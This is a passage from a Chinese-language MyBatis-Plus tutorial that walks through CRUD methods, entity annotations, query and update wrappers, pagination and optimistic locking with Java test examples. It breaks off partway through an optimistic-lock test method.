**调用方法：List\\<T> selectByMap(@Param(Constants.COLUMN_MAP) Map<String, Object> columnMap);**\n\n```java\n/**\n  * 根据Map所设置的条件查询用户\n  */\n@Test\npublic void testSelectByMap(){\n  //执行SQL为：SELECT id,name,age,email FROM user WHERE age = ?\n  Map<String,Object> map = new HashMap<>();\n  map.put(\"age\",18);\n  List<User> users = userMapper.selectByMap(map);\n  users.forEach(System.out::println);\n}\n```\n\n```\nUser(id=1, name=Jone, age=18, email=test1@baomidou.com)\n```\n\n##### d、查询所有用户信息\n\n> **调用方法：List\\<T> selectList(@Param(Constants.WRAPPER) Wrapper\\<T> queryWrapper);**\n\n```java\n/**\n  * 测试查询所有数据\n  */\n@Test\npublic void testSelectList(){\n  List<User> users = userMapper.selectList(null);\n  users.forEach(System.out::println);\n}\n```\n\n```\nUser(id=1, name=Jone, age=18, email=test1@baomidou.com)\nUser(id=2, name=Jack, age=20, email=test2@baomidou.com)\nUser(id=3, name=Tom, age=28, email=test3@baomidou.com)\nUser(id=4, name=Sandy, age=21, email=test4@baomidou.com)\nUser(id=5, name=Billie, age=24, email=test5@baomidou.com)\n```\n\n### 3.Service CRUD 接口\n\nService CRUD 封装 `IService` 接口，进一步封装 CRUD 采用 `get 查询单行` `remove 删除` `list 查询集合` `page 分页` 前缀命名方式区分 `Mapper` 层避免混淆\n\nMyBatis-Plus中有一个接口 **`IService`**和其实现类 **`ServiceImpl`**，封装了常见的业务层逻辑，详情查看源码IService 和 ServiceImpl\n\n因此我们在使用的时候仅需在自己定义的**`Service`**接口中继承**`IService`**接口，在自己的实现类中实现自己的Service并继承**`ServiceImpl`**即可\n\n> **IService中的CRUD方法**\n\n#### **增加：Save、SaveOrUpdate**\n\n```java\n// 插入一条记录（选择字段，策略插入）\nboolean save(T entity);\n// 插入（批量）\nboolean saveBatch(Collection<T> entityList);\n// 插入（批量）\nboolean saveBatch(Collection<T> entityList, int batchSize);\n\n// TableId 注解存在更新记录，否插入一条记录\nboolean saveOrUpdate(T entity);\n// 根据updateWrapper尝试更新，否继续执行saveOrUpdate(T)方法\nboolean saveOrUpdate(T entity, Wrapper<T> updateWrapper);\n// 批量修改插入\nboolean saveOrUpdateBatch(Collection<T> entityList);\n// 批量修改插入\nboolean saveOrUpdateBatch(Collection<T> entityList, int batchSize);\n```\n\n#### **删除：Remove**\n\n```java\n// 根据 entity 条件，删除记录\nboolean remove(Wrapper<T> queryWrapper);\n// 根据 ID 删除\nboolean removeById(Serializable id);\n// 根据 columnMap 条件，删除记录\nboolean removeByMap(Map<String, Object> columnMap);\n// 删除（根据ID 批量删除）\nboolean removeByIds(Collection<? extends Serializable> idList);\n```\n\n#### **修改：Update**\n\n```java\n// 根据 UpdateWrapper 条件，更新记录 需要设置sqlset\nboolean update(Wrapper<T> updateWrapper);\n// 根据 whereWrapper 条件，更新记录\nboolean update(T updateEntity, Wrapper<T> whereWrapper);\n// 根据 ID 选择修改\nboolean updateById(T entity);\n// 根据ID 批量更新\nboolean updateBatchById(Collection<T> entityList);\n// 根据ID 批量更新\nboolean updateBatchById(Collection<T> entityList, int batchSize);\n```\n\n#### **查询：Get、List、Count**\n\n```java\n// 根据 ID 查询\nT getById(Serializable id);\n// 根据 Wrapper，查询一条记录。结果集，如果是多个会抛出异常，随机取一条加上限制条件 wrapper.last(\"LIMIT 1\")\nT getOne(Wrapper<T> queryWrapper);\n// 根据 Wrapper，查询一条记录\nT getOne(Wrapper<T> queryWrapper, boolean throwEx);\n// 根据 Wrapper，查询一条记录\nMap<String, Object> getMap(Wrapper<T> queryWrapper);\n// 根据 Wrapper，查询一条记录\n<V> V getObj(Wrapper<T> queryWrapper, Function<? super Object, V> mapper);\n\n\n// 查询所有\nList<T> list();\n// 查询列表\nList<T> list(Wrapper<T> queryWrapper);\n// 查询（根据ID 批量查询）\nCollection<T> listByIds(Collection<? extends Serializable> idList);\n// 查询（根据 columnMap 条件）\nCollection<T> listByMap(Map<String, Object> columnMap);\n// 查询所有列表\nList<Map<String, Object>> listMaps();\n// 查询列表\nList<Map<String, Object>> listMaps(Wrapper<T> queryWrapper);\n// 查询全部记录\nList<Object> listObjs();\n// 查询全部记录\n<V> List<V> listObjs(Function<? super Object, V> mapper);\n// 根据 Wrapper 条件，查询全部记录\nList<Object> listObjs(Wrapper<T> queryWrapper);\n// 根据 Wrapper 条件，查询全部记录\n<V> List<V> listObjs(Wrapper<T> queryWrapper, Function<? super Object, V> mapper);\n\n// 查询总记录数\nint count();\n// 根据 Wrapper 条件，查询总记录数\nint count(Wrapper<T> queryWrapper);\n```\n\n#### **分页：Page**\n\n```java\n// 根据 ID 查询\nT getById(Serializable id);\n// 根据 Wrapper，查询一条记录。结果集，如果是多个会抛出异常，随机取一条加上限制条件 wrapper.last(\"LIMIT 1\")\nT getOne(Wrapper<T> queryWrapper);\n// 根据 Wrapper，查询一条记录\nT getOne(Wrapper<T> queryWrapper, boolean throwEx);\n// 根据 Wrapper，查询一条记录\nMap<String, Object> getMap(Wrapper<T> queryWrapper);\n// 根据 Wrapper，查询一条记录\n<V> V getObj(Wrapper<T> queryWrapper, Function<? super Object, V> mapper);\n```\n\n### 4.调用Service层操作数据\n\n> 我们在自己的Service接口中通过继承MyBatis-Plus提供的IService接口，不仅可以获得其提供的CRUD方法，而且还可以使用自身定义的方法。\n\n#### 创建Service接口和实现类\n\n**a.创建`UserService`并继承`IService`**\n\n```java\n/**\n  * UserService继承IService模板提供的基础功能 \n  */\npublic interface UserService extends IService<User> {}\n```\n\n**b.创建`UserService`的实现类并继承`ServiceImpl`**\n\n```java\n/**\n  * ServiceImpl实现了IService，提供了IService中基础功能的实现 \n  * 若ServiceImpl无法满足业务需求，则可以使用自定的UserService定义方法，并在实现类中实现\n  */\n\n@Service\npublic class UserServiceImpl extends ServiceImpl<UserMapper,User> implements UserService{}\n```\n\n#### 测试查询记录数\n\n> **调用方法：int count();**\n\n```java\n@Test\npublic void testGetCount(){\n    //查询总记录数\n    //执行的SQL为：SELECT COUNT( * ) FROM user\n    long count = userService.count();\n    System.out.println(\"总记录数：\" + count);\n}\n```\n\n#### 测试批量插入数据\n\n> **调用方法：boolean saveBatch(Collection\\<T> entityList);**\n\n```java\n@Test\npublic void test(){\n    List<User> list = new ArrayList<>();\n    for (int i = 1; i <= 10; i++) {\n        User user = new User();\n        user.setName(\"Vz\"+i);\n        user.setAge(20+i);\n        list.add(user);\n    }\n    boolean b = userService.saveBatch(list);\n    System.out.println(b ? \"添加成功！\" : \"添加失败！\");\n}\n```\n\n## 三、常用注解\n\n> MyBatis-Plus提供的注解可以帮我们解决一些数据库与实体之间相互映射的问题。\n\n### 1.@TableName\n\n> 经过以上的测试，在使用MyBatis-Plus实现基本的CRUD时，我们并没有指定要操作的表，只是在Mapper接口继承BaseMapper时，设置了泛型User，而操作的表为user表，由此得出结论，MyBatis-Plus在确定操作的表时，由BaseMapper的泛型决定，即实体类型决定，且默认操作的表名和实体类型的类名一致。\n\n#### 1.1\t引出问题\n\n---\n\n> **若实体类类型的类名和要操作的表的表名不一致，会出现什么问题？**\n\n我们将表`user`更名为`t_user`，测试查询功能\n\n![](https://img.jwt1399.top/img/202207031137784.png)\n\n程序抛出异常，**Table 'mybatis_plus.user' doesn't exist**，因为现在的表名为`t_user`，而默认操作的表名和实体类型的类名一致，即`user`表\n\n![](https://img.jwt1399.top/img/202207031137098.png)\n\n#### 1.2\t解决问题\n\n##### a、使用注解解决问题\n\n> **在实体类类型上添加`@TableName(\"t_user\")`，标识实体类对应的表，即可成功执行SQL语句**\n\n```java\n@Data\n@TableName(\"t_user\")\npublic class User {\n    private Long id;\n    private String name;\n    private Integer age;\n    private String email;\n}\n```\n\n##### b、使用全局配置解决问题\n\n> **在开发的过程中，我们经常遇到这样的问题，即实体类所对应的表都有固定的前缀，例如 `t_` 或 `tbl_` 此时，可以使用MyBatis-Plus提供的全局配置，为实体类所对应的表名设置默认的前缀，那么就不需要在每个实体类上通过@TableName标识实体类对应的表**\n\n```yml\nmybatis-plus:\n  global-config:\n    db-config:\n      # 设置实体类所对应的表的统一前缀\n      table-prefix: t_\n```\n\n### 2.@TableId\n\n> **MyBatis-Plus在实现CRUD时，会默认将id作为主键列，并在插入数据时，默认基于雪花算法的策略生成id**\n\n#### 2.1\t引出问题\n\n---\n\n> **若实体类和表中表示主键的不是id，而是其他字段，例如uid，MyBatis-Plus会自动识别uid为主键列吗？**\n\n我们实体类中的属性`id`改为`uid`，将表中的字段`id`也改为`uid`，测试添加功能\n\n![](https://img.jwt1399.top/img/202207031144629.png)\n\n![](https://img.jwt1399.top/img/202207031144303.png)\n\n程序抛出异常，**Field 'uid' doesn't have a default value**，说明MyBatis-Plus没有将`uid`作为主键赋值\n\n![](https://img.jwt1399.top/img/202207031145905.png)\n\n#### 2.2\t解决问题\n\n---\n\n> **在实体类中uid属性上通过`@TableId`将其标识为主键，即可成功执行SQL语句**\n\n```java\n@Date\npublic class User {\n    @TableId\n    private Long uid;\n    private String name;\n    private Integer age;\n    private String email;\n}\n```\n\n#### 2.3\t@TableId的value属性\n\n---\n\n> **若实体类中主键对应的属性为id，而表中表示主键的字段为uid**，此时若只在属性id上添加注解@TableId，则抛出异常**Unknown column 'id' in 'field list'**，即MyBatis-Plus仍然会将id作为表的主键操作，而表中表示主键的是字段uid此时需要通过@TableId注解的value属性，指定表中的主键字段，`@TableId(\"uid\")`或`@TableId(value=\"uid\")`\n\n![](https://img.jwt1399.top/img/202207031147569.png)\n\n#### 2.4\t@TableId的type属性\n\n---\n\n> **type属性用来定义主键策略：默认雪花算法**\n\n**常用的主键策略：**\n\n|            值            |                             描述                             |\n| :----------------------: | :----------------------------------------------------------: |\n| IdType.ASSIGN_ID（默认） |   基于雪花算法的策略生成数据id，与数据库id是否设置自增无关   |\n|       IdType.AUTO        | 使用数据库的自增策略，注意，该类型请确保数据库设置了id自增， |\n\n**配置全局主键策略：**\n\n```yml\nmybatis-plus:\n  global-config:\n    db-config:\n      #配置mp的主键策略为自增\n      id-type: auto\n```\n\n#### 2.5 雪花算法\n\n> 需要选择合适的方案去应对数据规模的增长，以应对逐渐增长的访问压力和数据量。数据库的扩展方式主要包括：业务分库、主从复制，数据库分表。\n\n数据分表： 将不同业务数据分散存储到不同的数据库服务器，能够支撑百万甚至千万用户规模的业务，但如果业务继续发展，同一业务的单表数据也会达到单台数据库服务器的处理瓶颈。例如，淘宝的几亿用户数据，如果全部存放在一台数据库服务器的一张表中，肯定是无法满足性能要求的，此时就需要对单表数据进行拆分。单表数据拆分有两种方式：垂直分表和水平分表。\n\n**a.主键自增**\n\n①以最常见的用户 ID 为例，可以按照 1000000 的范围大小进行分段，1 ~ 999999 放到表 1中， 1000000 ~ 1999999 放到表2中，以此类推。\n\n②复杂点：分段大小的选取。分段太小会导致切分后子表数量过多，增加维护复杂度；分段太大可能会导致单表依然存在性能问题，一般建议分段大小在 100 万至 2000 万之间，具体需要根据业务选取合适的分段大小。\n\n③优点：可以随着数据的增加平滑地扩充新的表。例如，现在的用户是 100 万，如果增加到 1000 万，只需要增加新的表就可以了，原有的数据不需要动。\n\n④缺点：分布不均匀。假如按照 1000 万来进行分表，有可能某个分段实际存储的数据量只有 1 条，而另外一个分段实际存储的数据量有 1000 万条。\n\n**b.取模**\n\n①同样以用户 ID 为例，假如我们一开始就规划了 10 个数据库表，可以简单地用 user_id % 10 的值来表示数据所属的数据库表编号，ID 为 985 的用户放到编号为 5 的子表中，ID 为 10086 的用户放到编号为 6 的子表中。\n\n②复杂点：初始表数量的确定。表数量太多维护比较麻烦，表数量太少又可能导致单表性能存在问题。\n\n③优点：表分布比较均匀。\n\n④缺点：扩充新的表很麻烦，所有数据都要重分布。\n\n**c.雪花算法**\n\n> 雪花算法是由Twitter公布的分布式主键生成算法，它能够保证不同表的主键的不重复性，以及相同表的主键的有序性。\n\n①核心思想：长度共64bit（一个long型）\n\n- `1bit`符号位，由于long基本类型在Java中是带符号的，最高位是符号位，正数是0，负数是1，id一般是正数，最高位是0。\n\n- `41bit`时间截(毫秒级)，存储的是时间截的差值（当前时间截 - 开始时间截)，结果约等于69.73年。 \n\n- `10bit`作为机器的ID（5个bit是数据中心，5个bit的机器ID，可以部署在1024个节点）。\n- `12bit`作为毫秒内的流水号（意味着每个节点在每毫秒可以产生 4096 个 ID）。\n\n![](https://img.jwt1399.top/img/202207031208423.png)\n\n②优点：整体上按照时间自增排序，并且整个分布式系统内不会产生ID碰撞，并且效率较高。\n\n### 3.@TbaleField\n\n> MyBatis-Plus在执行SQL语句时，要保证**实体类中的属性名**和**表中的字段名**`一致`\n>\n> 如果实体类中的属性名和字段名不一致的情况，会出现什么问题呢？\n\n#### 3.1\t情况一\n\n---\n\n若实体类中的属性使用的是驼峰命名风格，而表中的字段使用的是下划线命名风格\n\n例如实体类属性`userName`，表中字段`user_name`\n\n此时MyBatis-Plus会自动将下划线命名风格转化为驼峰命名风格\n\n相当于在MyBatis中配置\n\n#### 3.2\t情况二\n\n---\n\n> 若实体类中的属性和表中的字段不满足情况1\n>\n> 例如实体类属性`name`，表中字段`username`\n>\n> 此时需要在实体类属性上使用`@TableField(\"username\")`设置属性所对应的字段名\n\n```java\npublic class User {\n    @TableId(\"uid\")\n    private Long id;\n    @TableField(\"username\")\n    private String name;\n    private Integer age;\n    private String email;\n}\n```\n\n### 4.@TableLogic\n\n#### 4.1\t逻辑删除\n\n---\n\n> 物理删除：真实删除，将对应数据从数据库中删除，之后查询不到此条被删除的数据\n>\n> 逻辑删除：假删除，将对应数据中代表是否被删除字段的状态修改为“被删除状态”，之后在数据库中仍旧能看到此条数据记录\n>\n> 使用场景：可以进行数据恢复\n\n#### 4.2\t实现逻辑删除\n\n---\n\n- **数据库中创建逻辑删除状态列，设置默认值为0**\n\n  ![](https://img.jwt1399.top/img/202207031152971.png)\n\n- **实体类中添加逻辑删除属性**\n\n  ![](https://img.jwt1399.top/img/202207031152325.png)\n\n\n**测试删除功能**\n\n```java\npublic void testDeleteById(){\n    int result = userMapper.deleteById(1527472864163348482L);\n    System.out.println(result > 0 ? \"删除成功！\" : \"删除失败！\");\n    System.out.println(\"受影响的行数为：\" + result);\n}\n```\n\n**真正执行的是修改**\n\n```sql\nUPDATE t_user SET is_deleted=1 WHERE id=? AND is_deleted=0\n```\n\n![](https://img.jwt1399.top/img/202207031153004.png)\n\n**测试查询方法，被逻辑删除的数据默认不会被查询**\n\n**查询的结果自动添加条件`is_deleted=0`**\n\n![](https://img.jwt1399.top/img/202207031157318.png)\n\n## 四、条件构造器\n\n### 1.Wrapper介绍\n\n![](https://img.jwt1399.top/img/202207031615764.png)\n\n`Wrapper` ： 条件构造抽象类，最顶端父类\n\n- `AbstractWrapper `： 用于查询条件封装，生成 sql 的 where 条件\n\n  - `QueryWrapper `： 查询条件封装\n\n  - `UpdateWrapper `： Update 条件封装\n\n  - `AbstractLambdaWrapper `： 使用Lambda 语法\n\n    - `LambdaQueryWrapper `：用于Lambda语法使用的查询Wrapper\n\n    - `LambdaUpdateWrapper `： Lambda 更新封装Wrapper\n\n### 2.QueryWrapper\n\n#### **组装查询条件**\n\n> **执行SQL：**SELECT uid AS id,username AS name,age,email,is_deleted FROM t_user WHERE is_deleted=0 AND (username LIKE ? AND age BETWEEN ? AND ? AND email IS NOT NULL)\n\n```java\npublic void test01(){\n    //查询用户名包含a，年龄在20到30之间，邮箱信息不为null的用户信息\n    QueryWrapper<User> queryWrapper = new QueryWrapper<>();\n\t\tqueryWrapper.like(\"username\",\"a\")\n  \t\t\t\t\t\t\t.between(\"age\",20,30)\n      \t\t\t\t\t.isNotNull(\"email\");\n    List<User> users = userMapper.selectList(queryWrapper);\n    users.forEach(System.out::println);\n}\n```\n\n#### **组装排序条件**\n\n> **执行SQL：**SELECT uid AS id,username AS name,age,email,is_deleted FROM t_user WHERE is_deleted=0 ORDER BY age DESC,id ASC\n\n```java\npublic void test02(){\n    //查询用户信息，按照年龄的降序排序，若年龄相同，则按照id升序排序\n    QueryWrapper<User> queryWrapper = new QueryWrapper<>();\n    queryWrapper.orderByDesc(\"age\").orderByAsc(\"id\");\n    List<User> users = userMapper.selectList(queryWrapper);\n    users.forEach(System.out::println);\n}\n```\n\n#### **组装删除条件**\n\n> **执行SQL：**UPDATE t_user SET is_deleted=1 WHERE is_deleted=0 AND (email IS NULL)\n\n```java\npublic void test03(){\n    //删除邮箱地址为null的用户信息\n    QueryWrapper<User> queryWrapper = new QueryWrapper<>();\n    queryWrapper.isNull(\"email\");\n    int result = userMapper.delete(queryWrapper);\n    System.out.println(result > 0 ? \"删除成功！\" : \"删除失败！\");\n    System.out.println(\"受影响的行数为：\" + result);\n}\n```\n\n#### **条件的优先级**\n\n> **执行SQL：**UPDATE t_user SET user_name=?, email=? WHERE is_deleted=0 AND (age > ? AND user_name LIKE ? OR email IS NULL)\n\n```java\npublic void test04(){\n    //将（年龄大于20并且用户名中包含有a）或邮箱为null的用户信息修改\n    UpdateWrapper<User> updateWrapper = new UpdateWrapper<>();\n    updateWrapper.gt(\"age\",20).like(\"username\",\"a\").or().isNull(\"email\");\n    User user = new User();\n    user.setName(\"Oz\");\n    user.setEmail(\"test@oz6.com\");\n\n    int result = userMapper.update(user, updateWrapper);\n    System.out.println(result > 0 ? \"修改成功！\" : \"修改失败！\");\n    System.out.println(\"受影响的行数为：\" + result);\n}\n```\n\n> **执行SQL：**UPDATE t_user SET username=?, email=? WHERE is_deleted=0 AND (username LIKE ? AND (age > ? OR email IS NULL))\n\n```java\npublic void test05(){\n    //将用户名中包含有a并且（年龄大于20或邮箱为null）的用户信息修改\n    UpdateWrapper<User> updateWrapper = new UpdateWrapper<>();\n    updateWrapper.like(\"username\",\"a\").and(i->i.gt(\"age\",20).or().isNull(\"email\"));\n    User user = new User();\n    user.setName(\"Vz7797\");\n    user.setEmail(\"test@ss8o.com\");\n\n    int result = userMapper.update(user, updateWrapper);\n    System.out.println(result > 0 ? \"修改成功！\" : \"修改失败！\");\n    System.out.println(\"受影响的行数为：\" + result);\n}\n```\n\n#### **组装select子句**\n\n> **执行SQL：**SELECT username,age,email FROM t_user WHERE is_deleted=0\n\n```java\npublic void test06(){\n    //查询用户的用户名、年龄、邮箱信息\n    QueryWrapper<User> queryWrapper = new QueryWrapper<>();\n    queryWrapper.select(\"username\",\"age\",\"email\");\n    List<Map<String, Object>> maps = userMapper.selectMaps(queryWrapper);\n    maps.forEach(System.out::println);\n}\n```\n\n#### **实现子查询**\n\n> **执行SQL：**SELECT uid AS id,user_name AS name,age,email,is_deleted FROM t_user WHERE is_deleted=0 AND (uid IN (select uid from t_user where uid <= 100))\n\n```java\npublic void test07(){\n    //查询id小于等于100的用户信息\n    QueryWrapper<User> queryWrapper = new QueryWrapper<>();\n    queryWrapper.inSql(\"uid\", \"select uid from t_user where uid <= 100\");\n    List<User> list = userMapper.selectList(queryWrapper);\n    list.forEach(System.out::println);\n}\n```\n\n### 3.UpdateWrapper\n\n> UpdateWrapper不仅拥有QueryWrapper的组装条件功能，还提供了set方法进行修改对应条件的数据库信息\n\n```java\npublic void test08(){\n    //将用户名中包含有a并且（年龄大于20或邮箱为null）的用户信息修改\n    UpdateWrapper<User> updateWrapper = new UpdateWrapper<>();\n    updateWrapper.like(\"username\",\"a\")\n      \t\t\t\t\t.and(i -> i.gt(\"age\",20)\n                .or()\n                .isNull(\"email\"))\n     \t\t\t\t\t  .set(\"email\",\"jian@qq.com\");\n    int result = userMapper.update(null, updateWrapper);\n    System.out.println(result > 0 ? \"修改成功！\" : \"修改失败！\");\n    System.out.println(\"受影响的行数为：\" + result);\n}\n```\n\n### 4.condition\n\n> 在真正开发的过程中，组装条件是常见的功能，而这些条件往往来源于用户输入，是可选的，因此我们在组装这些条件时，必须先判断用户是否选择了这些条件，若选择则需要组装该条件，若没有选择则一定不能组装，以免影响SQL执行的结果\n\n**思路一**\n\n> **执行SQL：**SELECT uid AS id,user_name AS name,age,email,is_deleted FROM t_user WHERE is_deleted=0 AND (user_name LIKE ? AND age <= ?)\n\n```java\n public void test09(){\n     String username = \"a\";\n     Integer ageBegin = null;\n     Integer ageEnd = 30;\n     QueryWrapper<User> queryWrapper = new QueryWrapper<>();\n     if(StringUtils.isNotBlank(username)){\n         //isNotBlank判断某个字符创是否不为空字符串、不为null、不为空白符\n         queryWrapper.like(\"user_name\", username);\n     }\n     if(ageBegin != null){\n         queryWrapper.ge(\"age\", ageBegin);\n     }\n     if(ageEnd != null){\n         queryWrapper.le(\"age\", ageEnd);\n     }\n     List<User> list = userMapper.selectList(queryWrapper);\n     list.forEach(System.out::println);\n }\n```\n\n**思路二**\n\n> 上面的实现方案没有问题，但是代码比较复杂，我们可以使用带condition参数的重载方法构建查询条件，简化代码的编写\n\n```java\npublic void test10(){\n    String username = \"a\";\n    Integer ageBegin = null;\n    Integer ageEnd = 30;\n    QueryWrapper<User> queryWrapper = new QueryWrapper<>();\n    queryWrapper.like(StringUtils.isNotBlank(username), \"user_name\", username)\n        .ge(ageBegin != null, \"age\", ageBegin)\n        .le(ageEnd != null, \"age\", ageEnd);\n    List<User> list = userMapper.selectList(queryWrapper);\n    list.forEach(System.out::println);\n}\n```\n\n### 5.LambdaQueryWrapper\n\n> 功能等同于QueryWrapper，提供了Lambda表达式的语法可以避免填错列名。\n\n```java\npublic void test11(){\n    String username = \"a\";\n    Integer ageBegin = null;\n    Integer ageEnd = 30;\n    LambdaQueryWrapper<User> queryWrapper = new LambdaQueryWrapper<>();\n    queryWrapper.like(StringUtils.isNotBlank(username), User::getName, username)\n        .ge(ageBegin != null, User::getAge, ageBegin)\n        .le(ageEnd != null, User::getAge, ageEnd);\n    List<User> list = userMapper.selectList(queryWrapper);\n    list.forEach(System.out::println);\n}\n```\n\n###  6.LambdaUpdateWrapper\n\n> 功能等同于UpdateWrapper，提供了Lambda表达式的语法可以避免填错列名。\n\n```java\npublic void test12(){\n    //将用户名中包含有a并且（年龄大于20或邮箱为null）的用户信息修改\n    LambdaUpdateWrapper<User> updateWrapper = new LambdaUpdateWrapper<>();\n    updateWrapper.like(User::getName, \"a\")\n        .and(i -> i.gt(User::getAge, 20).or().isNull(User::getEmail));\n    updateWrapper.set(User::getName, \"小黑\").set(User::getEmail,\"abc@atguigu.com\");\n    int result = userMapper.update(null, updateWrapper);\n    System.out.println(\"result：\"+result);\n}\n```\n\n## 五、常用插件\n\n### 1.分页插件\n\n> MyBatis-Plus自带分页插件，只要简单的配置即可实现分页功能\n\n**添加配置类`config/MyBatisPlusConfig`**\n\n```java\n@Configuration\n@MapperScan(\"com.jianjian.mpdemo.mapper\")\npublic class MyBatisPlusConfig {\n    @Bean\n    public MybatisPlusInterceptor mybatisPlusInterceptor(){\n        MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor();\n        //添加分页插件\n        interceptor.addInnerInterceptor(new PaginationInnerInterceptor(DbType.MYSQL));\n        return interceptor;\n    }\n}\n```\n\n**编写测试方法**\n\n```java\n@Test\npublic void testPage(){\n  //new Page()中的两个参数分别是当前页码，每页显示数量\n  Page<User> page = userMapper.selectPage(new Page<>(1, 2), null);\n  List<User> users = page.getRecords();\n  users.forEach(System.out::println);\n  System.out.println(\"当前页：\"+page.getCurrent());\n  System.out.println(\"每页显示的条数：\"+page.getSize());\n  System.out.println(\"总记录数：\"+page.getTotal());\n  System.out.println(\"总页数：\"+page.getPages());\n  System.out.println(\"是否有上一页：\"+page.hasPrevious());\n  System.out.println(\"是否有下一页：\"+page.hasNext());\n}\n```\n\n### 2.自定义分页\n\n> 上面调用的是MyBatis-Plus提供的带有分页的方法，那么我们自己定义的方法如何实现分页呢？\n\n**在`UserMapper`接口中定义一个方法**\n\n```java\n/**\n  * 根据年龄查询用户列表，分页显示 \n  * @param page 分页对象,xml中可以从里面进行取值,传递参数 Page 即自动分页,必须放在第一位 \n  * @param age 年龄 \n  * @return \n  */\nPage<User> selectPageVo(@Param(\"page\") Page<User> page,@Param(\"age\") Integer age);\n```\n\n**在`UserMapper.xml`中编写SQL实现该方法**\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n<!DOCTYPE mapper\n        PUBLIC \"-//mybatis.org//DTD Mapper 3.0//EN\"\n        \"http://mybatis.org/dtd/mybatis-3-mapper.dtd\">\n<mapper namespace=\"com.jianjian.mpdemo.mapper.UserMapper\">\n    <select id=\"selectPageVo\" resultType=\"User\">\n        select id,name as name,age,email from t_user where age > #{age}\n    </select>\n</mapper>\n```\n\n**配置 resultType 别名**\n\n```yaml\nmybatis-plus:\n\t#配置类型别名所对应的包\n  type-aliases-package: com.jianjian.mpdemo.bean\n```\n\n**编写测试方法**\n\n```java\n@Test\npublic void testPageVo(){\n    Page<User> page = userMapper.selectPageVo(new Page<User>(1,2), 20);\n    List<User> users = page.getRecords();\n    users.forEach(System.out::println);\n}\n```\n\n### 3.乐观锁\n\n> **作用：当要更新一条记录的时候，希望这条记录没有被别人更新**\n\n乐观锁的实现方式：\n\n- 取出记录时，获取当前 version\n- 更新时，带上这个 version\n- 执行更新时， set version = newVersion where version = oldVersion\n- 如果 version 不对，就更新失败\n\n#### 3.1\t场景\n\n---\n\n- 一件商品，成本价是80元，售价是100元。老板先是通知小李，说你去把商品价格增加50元。小李正在玩游戏，耽搁了一个小时。正好一个小时后，老板觉得商品价格增加到150元，价格太高，可能会影响销量。又通知小王，你把商品价格降低30元。\n- 此时，小李和小王同时操作商品后台系统。小李操作的时候，系统先取出商品价格100元；小王也在操作，取出的商品价格也是100元。小李将价格加了50元，并将100+50=150元存入了数据库；小王将商品减了30元，并将100-30=70元存入了数据库。是的，如果没有锁，小李的操作就完全被小王的覆盖了。\n- 现在商品价格是70元，比成本价低10元。几分钟后，这个商品很快出售了1千多件商品，老板亏1万多。\n\n#### 3.2\t乐观锁与悲观锁\n\n---\n\n- 上面的故事，如果是乐观锁，小王保存价格前，会检查下价格是否被人修改过了。如果被修改过了，则重新取出的被修改后的价格，150元，这样他会将120元存入数据库。\n- 如果是悲观锁，小李取出数据后，小王只能等小李操作完之后，才能对价格进行操作，也会保证最终的价格是120元。\n\n#### 3.3\t模拟修改冲突\n\n---\n\n**数据库中增加商品表**\n\n```sql\nCREATE TABLE t_product ( \n    id BIGINT(20) NOT NULL COMMENT '主键ID', \n    NAME VARCHAR(30) NULL DEFAULT NULL COMMENT '商品名称', \n    price INT(11) DEFAULT 0 COMMENT '价格', \n    VERSION INT(11) DEFAULT 0 COMMENT '乐观锁版本号', \n    PRIMARY KEY (id) \n);\n```\n\n**添加一条数据**\n\n```sql\nINSERT INTO t_product (id, NAME, price) VALUES (1, '外星人笔记本', 100);\n```\n\n**添加一个实体类`Product`**\n\n```java\n@Data\npublic class Product {\n    private Long id;\n    private String name;\n    private Integer price;\n    private Integer version;\n}\n```\n\n**添加一个Mapper接口`ProductMapper`**\n\n```java\npublic interface ProductMapper extends BaseMapper<Product> {}\n```\n\n**测试方法**\n\n```java\n@Test\npublic void testProduct01(){\n    //1.小李获取商品价格\n    Product productLi = productMapper.selectById(1);\n    System.out.println(\"小李获取的商品价格为：\" + productLi.getPrice());\n\n    //2.小王获取商品价格\n    Product productWang = productMapper.selectById(1);\n    System.out.println(\"小李获取的商品价格为：\" + productWang.getPrice());\n\n    //3.小李修改商品价格+50\n    productLi.setPrice(productLi.getPrice()+50);\n    productMapper.updateById(productLi);\n\n    //4.小王修改商品价格-30\n    productWang.setPrice(productWang.getPrice()-30);\n    productMapper.updateById(productWang);\n\n    //5.老板查询商品价格\n    Product productBoss = productMapper.selectById(1);\n    System.out.println(\"老板获取的商品价格为：\" + productBoss.getPrice());\n}\n```\n\n**执行结果**\n\n![](https://img.jwt1399.top/img/202207041210392.png)\n\n#### 3.4\t乐观锁解决问题\n\n---\n\n**实体类`version`字段添加注解`@Version`**\n\n```java\n@Data\npublic class Product {\n    private Long id;\n    private String name;\n    private Integer price;\n    @Version\n    private Integer version;\n}\n```\n\n**添加乐观锁插件配置**\n\n```java\n@Bean\npublic MybatisPlusInterceptor mybatisPlusInterceptor(){\n    MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor();\n    //添加分页插件\n    interceptor.addInnerInterceptor(new PaginationInnerInterceptor(DbType.MYSQL));\n    //添加乐观锁插件\n    interceptor.addInnerInterceptor(new OptimisticLockerInnerInterceptor());\n    return interceptor;\n}\n```\n\n- **再次执行测试方法**\n\n  > 小李查询商品信息：\n  >\n  > ​\tSELECT id,name,price,version FROM t_product WHERE id=?\n  >\n  > 小王查询商品信息：\n  >\n  > ​\tSELECT id,name,price,version FROM t_product WHERE id=?\n  >\n  > 小李修改商品价格，自动将version+1\n  >\n  > ​\tUPDATE t_product SET name=?, price=?, version=? WHERE id=? AND version=?\n  >\n  > ​\tParameters: 外星人笔记本(String), 150(Integer), 1(Integer), 1(Long), 0(Integer)\n  >\n  > 小王修改商品价格，此时version已更新，条件不成立，修改失败\n  >\n  > ​\tUPDATE t_product SET name=?, price=?, version=? WHERE id=? AND version=?\n  >\n  > ​\tParameters: 外星人笔记本(String), 70(Integer), 1(Integer), 1(Long), 0(Integer)\n  >\n  > 最终，小王修改失败，查询价格：150\n  >\n  > ​\tSELECT id,name,price,version FROM t_product WHERE id=?\n\n\n**优化执行流程**\n\n```java\n@Test\npublic void testProduct01(){\n    //1.小李获取商品价格\n    Product productLi = productMapper.selectById(1);\n    System.out.println(\"小李获取的商品价格为：\" + productLi.getPrice());\n\n    //2.小王获取商品价格\n    Product productWang = productMapper.selectById(1);\n    System.out.println(\"小李获取的商品价格为：\" + productWang.getPrice());\n\n    //3.小李修改商品价格+50\n    productLi.setPrice(productLi.getPrice()+50);\n    productMapper.updateById(productLi);\n\n    //4.小王修改商品价格-30\n    